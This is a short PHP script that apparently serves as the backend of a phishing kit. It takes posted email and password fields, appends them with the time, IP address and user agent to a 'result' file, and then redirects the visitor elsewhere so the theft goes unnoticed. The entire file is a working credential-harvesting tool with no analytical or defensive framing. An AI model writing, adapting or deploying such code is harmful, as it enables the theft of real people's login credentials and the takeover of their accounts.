<?php
require($_SERVER['DOCUMENT_ROOT'].'/config/config.php');
if($_POST['email'] == "" || $_POST['pass'] == "") {
	header('Location: http://'.$_SERVER['HTTP_HOST'].'/');
	exit();
}
else {
	$handle = fopen($_SERVER['DOCUMENT_ROOT'].'/result/'.$result, "a");
	$content = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/result/'.$result); {
		fwrite($handle, "Datetime: ".date('d-m-Y H:i:s')."\nIP: ".$_SERVER['REMOTE_ADDR']."\nUser-Agent: ".$_SERVER['HTTP_USER_AGENT']."\nLogin: ".$_POST['email']."\nPass: ".$_POST['pass']."\n\n");
	}
	fclose($handle);
	header('Location: '.$redirect.'');
	exit();
}
?>